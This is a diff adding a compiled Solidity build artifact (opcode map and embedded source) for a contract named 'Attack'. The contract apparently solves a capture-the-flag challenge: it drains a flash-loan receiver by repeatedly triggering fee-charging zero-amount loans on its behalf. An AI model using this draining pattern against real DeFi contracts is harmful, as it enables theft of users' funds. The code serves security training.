+        555
+      ],
+      "op": "SLOAD",
+      "path": "2"
+    },
+    "229": {
+      "fn": "Attack.initialize",
+      "offset": [
+        486,
+        555
+      ],
+      "op": "SWAP3",
+      "path": "2"
+    },
+    "230": {
+      "fn": "Attack.initialize",
+      "offset": [
+        486,
+        555
+      ],
+      "op": "SWAP1",
+      "path": "2"
+    },
+    "231": {
+      "fn": "Attack.initialize",
+      "offset": [
+        486,
+        555
+      ],
+      "op": "SWAP4",
+      "path": "2"
+    },
+    "232": {
+      "fn": "Attack.initialize",
+      "offset": [
+        486,
+        555
+      ],
+      "op": "AND",
+      "path": "2"
+    },
+    "233": {
+      "fn": "Attack.initialize",
+      "offset": [
+        486,
+        555
+      ],
+      "op": "SWAP2",
+      "path": "2"
+    },
+    "234": {
+      "fn": "Attack.initialize",
+      "offset": [
+        486,
+        555
+      ],
+      "op": "AND",
+      "path": "2"
+    },
+    "235": {
+      "fn": "Attack.initialize",
+      "offset": [
+        486,
+        555
+      ],
+      "op": "OR",
+      "path": "2"
+    },
+    "236": {
+      "fn": "Attack.initialize",
+      "offset": [
+        486,
+        555
+      ],
+      "op": "SWAP1",
+      "path": "2"
+    },
+    "237": {
+      "fn": "Attack.initialize",
+      "offset": [
+        486,
+        555
+      ],
+      "op": "SSTORE",
+      "path": "2"
+    },
+    "238": {
+      "fn": "Attack.initialize",
+      "offset": [
+        347,
+        562
+      ],
+      "op": "JUMP",
+      "path": "2"
+    },
+    "239": {
+      "fn": "Attack.initialize",
+      "offset": [
+        347,
+        562
+      ],
+      "op": "JUMPDEST",
+      "path": "2"
+    },
+    "240": {
+      "fn": "Attack.initialize",
+      "offset": [
+        347,
+        562
+      ],
+      "op": "STOP",
+      "path": "2"
+    },
+    "241": {
+      "fn": "Attack.execute",
+      "offset": [
+        851,
+        1125
+      ],
+      "op": "JUMPDEST",
+      "path": "2"
+    },
+    "242": {
+      "fn": "Attack.execute",
+      "offset": [
+        851,
+        1125
+      ],
+      "op": "PUSH2",
+      "path": "2",
+      "value": "0xEF"
+    },
+    "245": {
+      "fn": "Attack.execute",
+      "offset": [
+        851,
+        1125
+      ],
+      "op": "PUSH2",
+      "path": "2",
+      "value": "0x11E"
+    },
+    "248": {
+      "fn": "Attack.execute",
+      "jump": "i",
+      "offset": [
+        851,
+        1125
+      ],
+      "op": "JUMP",
+      "path": "2"
+    },
+    "249": {
+      "offset": [
+        283,
+        340
+      ],
+      "op": "JUMPDEST",
+      "path": "2"
+    },
+    "250": {
+      "fn": "Attack.execute",
+      "offset": [
+        283,
+        340
+      ],
+      "op": "PUSH1",
+      "path": "2",
+      "value": "0x1"
+    },
+    "252": {
+      "fn": "Attack.execute",
+      "offset": [
+        283,
+        340
+      ],
+      "op": "SLOAD",
+      "path": "2"
+    },
+    "253": {
+      "fn": "Attack.execute",
+      "offset": [
+        283,
+        340
+      ],
+      "op": "PUSH2",
+      "path": "2",
+      "value": "0x9B"
+    },
+    "256": {
+      "fn": "Attack.execute",
+      "offset": [
+        283,
+        340
+      ],
+      "op": "SWAP1",
+      "path": "2"
+    },
+    "257": {
+      "op": "PUSH1",
+      "value": "0x1"
+    },
+    "259": {
+      "op": "PUSH1",
+      "value": "0x1"
+    },
+    "261": {
+      "op": "PUSH1",
+      "value": "0xA0"
+    },
+    "263": {
+      "op": "SHL"
+    },
+    "264": {
+      "op": "SUB"
+    },
+    "265": {
+      "offset": [
+        283,
+        340
+      ],
+      "op": "AND",
+      "path": "2"
+    },
+    "266": {
+      "fn": "Attack.execute",
+      "offset": [
+        283,
+        340
+      ],
+      "op": "DUP2",
+      "path": "2"
+    },
+    "267": {
+      "fn": "Attack.execute",
+      "offset": [
+        283,
+        340
+      ],
+      "op": "JUMP",
+      "path": "2"
+    },
+    "268": {
+      "fn": "Attack.viewFlashLoanBalance",
+      "offset": [
+        568,
+        693
+      ],
+      "op": "JUMPDEST",
+      "path": "2"
+    },
+    "269": {
+      "fn": "Attack.viewFlashLoanBalance",
+      "offset": [
+        620,
+        627
+      ],
+      "op": "PUSH1",
+      "path": "2",
+      "value": "0x0"
+    },
+    "271": {
+      "fn": "Attack.viewFlashLoanBalance",
+      "offset": [
+        658,
+        677
+      ],
+      "op": "SLOAD",
+      "path": "2",
+      "statement": 3
+    },
+    "272": {
+      "op": "PUSH1",
+      "value": "0x1"
+    },
+    "274": {
+      "op": "PUSH1",
+      "value": "0x1"
+    },
+    "276": {
+      "op": "PUSH1",
+      "value": "0xA0"
+    },
+    "278": {
+      "op": "SHL"
+    },
+    "279": {
+      "op": "SUB"
+    },
+    "280": {
+      "fn": "Attack.viewFlashLoanBalance",
+      "offset": [
+        658,
+        677
+      ],
+      "op": "AND",
+      "path": "2"
+    },
+    "281": {
+      "fn": "Attack.viewFlashLoanBalance",
+      "offset": [
+        650,
+        686
+      ],
+      "op": "BALANCE",
+      "path": "2"
+    },
+    "282": {
+      "fn": "Attack.viewFlashLoanBalance",
+      "offset": [
+        568,
+        693
+      ],
+      "op": "PUSH2",
+      "path": "2",
+      "value": "0x75"
+    },
+    "285": {
+      "fn": "Attack.viewFlashLoanBalance",
+      "offset": [
+        568,
+        693
+      ],
+      "op": "JUMP",
+      "path": "2"
+    },
+    "286": {
+      "fn": "Attack.execute",
+      "offset": [
+        851,
+        1125
+      ],
+      "op": "JUMPDEST",
+      "path": "2"
+    },
+    "287": {
+      "fn": "Attack.execute",
+      "offset": [
+        891,
+        900
+      ],
+      "op": "PUSH1",
+      "path": "2",
+      "value": "0x0"
+    },
+    "289": {
+      "fn": "Attack.execute",
+      "offset": [
+        911,
+        930
+      ],
+      "op": "SLOAD",
+      "path": "2"
+    },
+    "290": {
+      "op": "PUSH1",
+      "value": "0x1"
+    },
+    "292": {
+      "op": "PUSH1",
+      "value": "0x1"
+    },
+    "294": {
+      "op": "PUSH1",
+      "value": "0xA0"
+    },
+    "296": {
+      "op": "SHL"
+    },
+    "297": {
+      "op": "SUB"
+    },
+    "298": {
+      "fn": "Attack.execute",
+      "offset": [
+        911,
+        930
+      ],
+      "op": "AND",
+      "path": "2"
+    },
+    "299": {
+      "fn": "Attack.execute",
+      "offset": [
+        903,
+        939
+      ],
+      "op": "BALANCE",
+      "path": "2"
+    },
+    "300": {
+      "fn": "Attack.execute",
+      "offset": [
+        949,
+        1119
+      ],
+      "op": "JUMPDEST",
+      "path": "2"
+    },
+    "301": {
+      "fn": "Attack.execute",
+      "offset": [
+        956,
+        961
+      ],
+      "op": "DUP1",
+      "path": "2"
+    },
+    "302": {
+      "fn": "Attack.execute",
+      "offset": [
+        956,
+        961
+      ],
+      "op": "ISZERO",
+      "path": "2"
+    },
+    "303": {
+      "fn": "Attack.execute",
+      "offset": [
+        949,
+        1119
+      ],
+      "op": "PUSH2",
+      "path": "2",
+      "value": "0x1B2"
+    },
+    "306": {
+      "fn": "Attack.execute",
+      "offset": [
+        949,
+        1119
+      ],
+      "op": "JUMPI",
+      "path": "2"
+    },
+    "307": {
+      "fn": "Attack.execute",
+      "offset": [
+        985,
+        1011
+      ],
+      "op": "PUSH1",
+      "path": "2",
+      "statement": 4,
+      "value": "0x1"
+    },
+    "309": {
+      "fn": "Attack.execute",
+      "offset": [
+        985,
+        1011
+      ],
+      "op": "SLOAD",
+      "path": "2"
+    },
+    "310": {
+      "fn": "Attack.execute",
+      "offset": [
+        985,
+        1011
+      ],
+      "op": "PUSH1",
+      "path": "2",
+      "value": "0x0"
+    },
+    "312": {
+      "fn": "Attack.execute",
+      "offset": [
+        1030,
+        1049
+      ],
+      "op": "DUP1",
+      "path": "2"
+    },
+    "313": {
+      "fn": "Attack.execute",
+      "offset": [
+        1030,
+        1049
+      ],
+      "op": "SLOAD",
+      "path": "2"
+    },
+    "314": {
+      "fn": "Attack.execute",
+      "offset": [
+        985,
+        1054
+      ],
+      "op": "PUSH1",
+      "path": "2",
+      "value": "0x40"
+    },
+    "316": {
+      "fn": "Attack.execute",
+      "offset": [
+        985,
+        1054
+      ],
+      "op": "MLOAD",
+      "path": "2"
+    },
+    "317": {
+      "op": "PUSH4",
+      "value": "0x27679197"
+    },
+    "322": {
+      "op": "PUSH1",
+      "value": "0xE2"
+    },
+    "324": {
+      "op": "SHL"
+    },
+    "325": {
+      "fn": "Attack.execute",
+      "offset": [
+        985,
+        1054
+      ],
+      "op": "DUP2",
+      "path": "2"
+    },
+    "326": {
+      "fn": "Attack.execute",
+      "offset": [
+        985,
+        1054
+      ],
+      "op": "MSTORE",
+      "path": "2"
+    },
+    "327": {
+      "op": "PUSH1",
+      "value": "0x1"
+    },
+    "329": {
+      "op": "PUSH1",
+      "value": "0x1"
+    },
+    "331": {
+      "op": "PUSH1",
+      "value": "0xA0"
+    },
+    "333": {
+      "op": "SHL"
+    },
+    "334": {
+      "op": "SUB"
+    },
+    "335": {
+      "fn": "Attack.execute",
+      "offset": [
+        1030,
+        1049
+      ],
+      "op": "SWAP2",
+      "path": "2"
+    },
+    "336": {
+      "fn": "Attack.execute",
+      "offset": [
+        1030,
+        1049
+      ],
+      "op": "DUP3",
+      "path": "2"
+    },
+    "337": {
+      "fn": "Attack.execute",
+      "offset": [
+        1030,
+        1049
+      ],
+      "op": "AND",
+      "path": "2"
+    },
+    "338": {
+      "fn": "Attack.execute",
+      "offset": [
+        985,
+        1054
+      ],
+      "op": "PUSH1",
+      "path": "2",
+      "value": "0x4"
+    },
+    "340": {
+      "fn": "Attack.execute",
+      "offset": [
+        985,
+        1054
+      ],
+      "op": "DUP3",
+      "path": "2"
+    },
+    "341": {
+      "fn": "Attack.execute",
+      "offset": [
+        985,
+        1054
+      ],
+      "op": "ADD",
+      "path": "2"
+    },
+    "342": {
+      "op": "MSTORE"
+    },
+    "343": {
+      "op": "PUSH1",
+      "value": "0x24"
+    },
+    "345": {
+      "op": "DUP2"
+    },
+    "346": {
+      "op": "ADD"
+    },
+    "347": {
+      "op": "SWAP3"
+    },
+    "348": {
+      "op": "SWAP1"
+    },
+    "349": {
+      "op": "SWAP3"
+    },
+    "350": {
+      "op": "MSTORE"
+    },
+    "351": {
+      "fn": "Attack.execute",
+      "offset": [
+        985,
+        1011
+      ],
+      "op": "SWAP1",
+      "path": "2"
+    },
+    "352": {
+      "fn": "Attack.execute",
+      "offset": [
+        985,
+        1011
+      ],
+      "op": "SWAP2",
+      "path": "2"
+    },
+    "353": {
+      "fn": "Attack.execute",
+      "offset": [
+        985,
+        1011
+      ],
+      "op": "AND",
+      "path": "2"
+    },
+    "354": {
+      "fn": "Attack.execute",
+      "offset": [
+        985,
+        1011
+      ],
+      "op": "SWAP1",
+      "path": "2"
+    },
+    "355": {
+      "fn": "Attack.execute",
+      "offset": [
+        985,
+        1021
+      ],
+      "op": "PUSH4",
+      "path": "2",
+      "value": "0x9D9E465C"
+    },
+    "360": {
+      "fn": "Attack.execute",
+      "offset": [
+        985,
+        1021
+      ],
+      "op": "SWAP1",
+      "path": "2"
+    },
+    "361": {
+      "op": "PUSH1",
+      "value": "0x44"
+    },
+    "363": {
+      "op": "ADD"
+    },
+    "364": {
+      "fn": "Attack.execute",
+      "offset": [
+        985,
+        1054
+      ],
+      "op": "PUSH1",
+      "path": "2",
+      "value": "0x0"
+    },
+    "366": {
+      "fn": "Attack.execute",
+      "offset": [
+        985,
+        1054
+      ],
+      "op": "PUSH1",
+      "path": "2",
+      "value": "0x40"
+    },
+    "368": {
+      "fn": "Attack.execute",
+      "offset": [
+        985,
+        1054
+      ],
+      "op": "MLOAD",
+      "path": "2"
+    },
+    "369": {
+      "fn": "Attack.execute",
+      "offset": [
+        985,
+        1054
+      ],
+      "op": "DUP1",
+      "path": "2"
+    },
+    "370": {
+      "fn": "Attack.execute",
+      "offset": [
+        985,
+        1054
+      ],
+      "op": "DUP4",
+      "path": "2"
+    },
+    "371": {
+      "fn": "Attack.execute",
+      "offset": [
+        985,
+        1054
+      ],
+      "op": "SUB",
+      "path": "2"
+    },
+    "372": {
+      "fn": "Attack.execute",
+      "offset": [
+        985,
+        1054
+      ],
+      "op": "DUP2",
+      "path": "2"
+    },
+    "373": {
+      "fn": "Attack.execute",
+      "offset": [
+        985,
+        1054
+      ],
+      "op": "PUSH1",
+      "path": "2",
+      "value": "0x0"
+    },
+    "375": {
+      "fn": "Attack.execute",
+      "offset": [
+        985,
+        1054
+      ],
+      "op": "DUP8",
+      "path": "2"
+    },
+    "376": {
+      "fn": "Attack.execute",
+      "offset": [
+        985,
+        1054
+      ],
+      "op": "DUP1",
+      "path": "2"
+    },
+    "377": {
+      "fn": "Attack.execute",
+      "offset": [
+        985,
+        1054
+      ],
+      "op": "EXTCODESIZE",
+      "path": "2"
+    },
+    "378": {
+      "fn": "Attack.execute",
+      "offset": [
+        985,
+        1054
+      ],
+      "op": "ISZERO",
+      "path": "2"
+    },
+    "379": {
+      "fn": "Attack.execute",
+      "offset": [
+        985,
+        1054
+      ],
+      "op": "DUP1",
+      "path": "2"
+    },
+    "380": {
+      "fn": "Attack.execute",
+      "offset": [
+        985,
+        1054
+      ],
+      "op": "ISZERO",
+      "path": "2"
+    },
+    "381": {
+      "fn": "Attack.execute",
+      "offset": [
+        985,
+        1054
+      ],
+      "op": "PUSH2",
+      "path": "2",
+      "value": "0x185"
+    },
+    "384": {
+      "fn": "Attack.execute",
+      "offset": [
+        985,
+        1054
+      ],
+      "op": "JUMPI",
+      "path": "2"
+    },
+    "385": {
+      "fn": "Attack.execute",
+      "offset": [
+        985,
+        1054
+      ],
+      "op": "PUSH1",
+      "path": "2",
+      "value": "0x0"
+    },
+    "387": {
+      "fn": "Attack.execute",
+      "offset": [
+        985,
+        1054
+      ],
+      "op": "DUP1",
+      "path": "2"
+    },
+    "388": {
+      "fn": "Attack.execute",
+      "offset": [
+        985,
+        1054
+      ],
+      "op": "REVERT",
+      "path": "2"
+    },
+    "389": {
+      "fn": "Attack.execute",
+      "offset": [
+        985,
+        1054
+      ],
+      "op": "JUMPDEST",
+      "path": "2"
+    },
+    "390": {
+      "fn": "Attack.execute",
+      "offset": [
+        985,
+        1054
+      ],
+      "op": "POP",
+      "path": "2"
+    },
+    "391": {
+      "fn": "Attack.execute",
+      "offset": [
+        985,
+        1054
+      ],
+      "op": "GAS",
+      "path": "2"
+    },
+    "392": {
+      "fn": "Attack.execute",
+      "offset": [
+        985,
+        1054
+      ],
+      "op": "CALL",
+      "path": "2"
+    },
+    "393": {
+      "fn": "Attack.execute",
+      "offset": [
+        985,
+        1054
+      ],
+      "op": "ISZERO",
+      "path": "2"
+    },
+    "394": {
+      "fn": "Attack.execute",
+      "offset": [
+        985,
+        1054
+      ],
+      "op": "DUP1",
+      "path": "2"
+    },
+    "395": {
+      "fn": "Attack.execute",
+      "offset": [
+        985,
+        1054
+      ],
+      "op": "ISZERO",
+      "path": "2"
+    },
+    "396": {
+      "fn": "Attack.execute",
+      "offset": [
+        985,
+        1054
+      ],
+      "op": "PUSH2",
+      "path": "2",
+      "value": "0x199"
+    },
+    "399": {
+      "fn": "Attack.execute",
+      "offset": [
+        985,
+        1054
+      ],
+      "op": "JUMPI",
+      "path": "2"
+    },
+    "400": {
+      "fn": "Attack.execute",
+      "offset": [
+        985,
+        1054
+      ],
+      "op": "RETURNDATASIZE",
+      "path": "2"
+    },
+    "401": {
+      "fn": "Attack.execute",
+      "offset": [
+        985,
+        1054
+      ],
+      "op": "PUSH1",
+      "path": "2",
+      "value": "0x0"
+    },
+    "403": {
+      "fn": "Attack.execute",
+      "offset": [
+        985,
+        1054
+      ],
+      "op": "DUP1",
+      "path": "2"
+    },
+    "404": {
+      "fn": "Attack.execute",
+      "offset": [
+        985,
+        1054
+      ],
+      "op": "RETURNDATACOPY",
+      "path": "2"
+    },
+    "405": {
+      "fn": "Attack.execute",
+      "offset": [
+        985,
+        1054
+      ],
+      "op": "RETURNDATASIZE",
+      "path": "2"
+    },
+    "406": {
+      "fn": "Attack.execute",
+      "offset": [
+        985,
+        1054
+      ],
+      "op": "PUSH1",
+      "path": "2",
+      "value": "0x0"
+    },
+    "408": {
+      "fn": "Attack.execute",
+      "offset": [
+        985,
+        1054
+      ],
+      "op": "REVERT",
+      "path": "2"
+    },
+    "409": {
+      "fn": "Attack.execute",
+      "offset": [
+        985,
+        1054
+      ],
+      "op": "JUMPDEST",
+      "path": "2"
+    },
+    "410": {
+      "op": "POP"
+    },
+    "411": {
+      "op": "POP"
+    },
+    "412": {
+      "fn": "Attack.execute",
+      "offset": [
+        1080,
+        1099
+      ],
+      "op": "PUSH1",
+      "path": "2",
+      "statement": 5,
+      "value": "0x0"
+    },
+    "414": {
+      "fn": "Attack.execute",
+      "offset": [
+        1080,
+        1099
+      ],
+      "op": "SLOAD",
+      "path": "2"
+    },
+    "415": {
+      "op": "PUSH1",
+      "value": "0x1"
+    },
+    "417": {
+      "op": "PUSH1",
+      "value": "0x1"
+    },
+    "419": {
+      "op": "PUSH1",
+      "value": "0xA0"
+    },
+    "421": {
+      "op": "SHL"
+    },
+    "422": {
+      "op": "SUB"
+    },
+    "423": {
+      "fn": "Attack.execute",
+      "offset": [
+        1080,
+        1099
+      ],
+      "op": "AND",
+      "path": "2"
+    },
+    "424": {
+      "fn": "Attack.execute",
+      "offset": [
+        1072,
+        1108
+      ],
+      "op": "BALANCE",
+      "path": "2"
+    },
+    "425": {
+      "fn": "Attack.execute",
+      "offset": [
+        1072,
+        1108
+      ],
+      "op": "SWAP3",
+      "path": "2"
+    },
+    "426": {
+      "op": "POP"
+    },
+    "427": {
+      "fn": "Attack.execute",
+      "offset": [
+        949,
+        1119
+      ],
+      "op": "PUSH2",
+      "path": "2",
+      "value": "0x12C"
+    },
+    "430": {
+      "fn": "Attack.execute",
+      "offset": [
+        949,
+        1119
+      ],
+      "op": "SWAP2",
+      "path": "2"
+    },
+    "431": {
+      "op": "POP"
+    },
+    "432": {
+      "op": "POP"
+    },
+    "433": {
+      "fn": "Attack.execute",
+      "offset": [
+        949,
+        1119
+      ],
+      "op": "JUMP",
+      "path": "2"
+    },
+    "434": {
+      "fn": "Attack.execute",
+      "offset": [
+        949,
+        1119
+      ],
+      "op": "JUMPDEST",
+      "path": "2"
+    },
+    "435": {
+      "fn": "Attack.execute",
+      "offset": [
+        881,
+        1125
+      ],
+      "op": "POP",
+      "path": "2"
+    },
+    "436": {
+      "fn": "Attack.execute",
+      "jump": "o",
+      "offset": [
+        851,
+        1125
+      ],
+      "op": "JUMP",
+      "path": "2"
+    },
+    "437": {
+      "op": "JUMPDEST"
+    },
+    "438": {
+      "op": "DUP1"
+    },
+    "439": {
+      "op": "CALLDATALOAD"
+    },
+    "440": {
+      "op": "PUSH1",
+      "value": "0x1"
+    },
+    "442": {
+      "op": "PUSH1",
+      "value": "0x1"
+    },
+    "444": {
+      "op": "PUSH1",
+      "value": "0xA0"
+    },
+    "446": {
+      "op": "SHL"
+    },
+    "447": {
+      "op": "SUB"
+    },
+    "448": {
+      "op": "DUP2"
+    },
+    "449": {
+      "op": "AND"
+    },
+    "450": {
+      "op": "DUP2"
+    },
+    "451": {
+      "op": "EQ"
+    },
+    "452": {
+      "op": "PUSH2",
+      "value": "0x1CC"
+    },
+    "455": {
+      "op": "JUMPI"
+    },
+    "456": {
+      "op": "PUSH1",
+      "value": "0x0"
+    },
+    "458": {
+      "op": "DUP1"
+    },
+    "459": {
+      "op": "REVERT"
+    },
+    "460": {
+      "op": "JUMPDEST"
+    },
+    "461": {
+      "op": "SWAP2"
+    },
+    "462": {
+      "op": "SWAP1"
+    },
+    "463": {
+      "op": "POP"
+    },
+    "464": {
+      "jump": "o",
+      "op": "JUMP"
+    },
+    "465": {
+      "op": "JUMPDEST"
+    },
+    "466": {
+      "op": "PUSH1",
+      "value": "0x0"
+    },
+    "468": {
+      "op": "DUP1"
+    },
+    "469": {
+      "op": "PUSH1",
+      "value": "0x40"
+    },
+    "471": {
+      "op": "DUP4"
+    },
+    "472": {
+      "op": "DUP6"
+    },
+    "473": {
+      "op": "SUB"
+    },
+    "474": {
+      "op": "SLT"
+    },
+    "475": {
+      "op": "ISZERO"
+    },
+    "476": {
+      "op": "PUSH2",
+      "value": "0x1E4"
+    },
+    "479": {
+      "op": "JUMPI"
+    },
+    "480": {
+      "op": "PUSH1",
+      "value": "0x0"
+    },
+    "482": {
+      "op": "DUP1"
+    },
+    "483": {
+      "op": "REVERT"
+    },
+    "484": {
+      "op": "JUMPDEST"
+    },
+    "485": {
+      "op": "PUSH2",
+      "value": "0x1ED"
+    },
+    "488": {
+      "op": "DUP4"
+    },
+    "489": {
+      "op": "PUSH2",
+      "value": "0x1B5"
+    },
+    "492": {
+      "jump": "i",
+      "op": "JUMP"
+    },
+    "493": {
+      "op": "JUMPDEST"
+    },
+    "494": {
+      "op": "SWAP2"
+    },
+    "495": {
+      "op": "POP"
+    },
+    "496": {
+      "op": "PUSH2",
+      "value": "0x1FB"
+    },
+    "499": {
+      "op": "PUSH1",
+      "value": "0x20"
+    },
+    "501": {
+      "op": "DUP5"
+    },
+    "502": {
+      "op": "ADD"
+    },
+    "503": {
+      "op": "PUSH2",
+      "value": "0x1B5"
+    },
+    "506": {
+      "jump": "i",
+      "op": "JUMP"
+    },
+    "507": {
+      "op": "JUMPDEST"
+    },
+    "508": {
+      "op": "SWAP1"
+    },
+    "509": {
+      "op": "POP"
+    },
+    "510": {
+      "op": "SWAP3"
+    },
+    "511": {
+      "op": "POP"
+    },
+    "512": {
+      "op": "SWAP3"
+    },
+    "513": {
+      "op": "SWAP1"
+    },
+    "514": {
+      "op": "POP"
+    },
+    "515": {
+      "jump": "o",
+      "op": "JUMP"
+    }
+  },
+  "sha1": "088c1998b26ebe636a9c741708c7d572550ecab2",
+  "source": "// SPDX-License-Identifier: MIT\npragma solidity >=0.6.0;\nimport \"./FlashLoanReceiver.sol\";\nimport \"./NaiveReceiverLenderPool.sol\";\n\n/*\n* @title: \n* @author: Anthony (fps) https://github.com/fps8k .\n* @dev: \n*/\n\ncontract Attack\n{\n    FlashLoanReceiver public flash_loan_receiver;\n    NaiveReceiverLenderPool public naive_receiver_lender_pool;\n\n    function initialize(address _flash, address _naive) public\n    {\n        flash_loan_receiver = FlashLoanReceiver(payable(_flash));\n        naive_receiver_lender_pool = NaiveReceiverLenderPool(payable(_naive));\n    }\n\n    function viewFlashLoanBalance() public view returns(uint256)\n    {\n        return address(flash_loan_receiver).balance;\n    }\n\n    function viewNaiveReceiverLenderPoolBalance() public view returns(uint256)\n    {\n        return address(naive_receiver_lender_pool).balance;\n    }\n\n    function execute() public\n    {\n        uint256 j = address(flash_loan_receiver).balance;\n        while (j > 0)\n        {\n            naive_receiver_lender_pool.flashLoan(address(flash_loan_receiver), 0);\n            j = address(flash_loan_receiver).balance;\n        }\n    }\n}",
+  "sourceMap": "211:916:2:-:0;;;;;;;;;;;;;;;;;;;",
+  "sourcePath": "contracts/Attack.sol",
+  "type": "contract"
+}
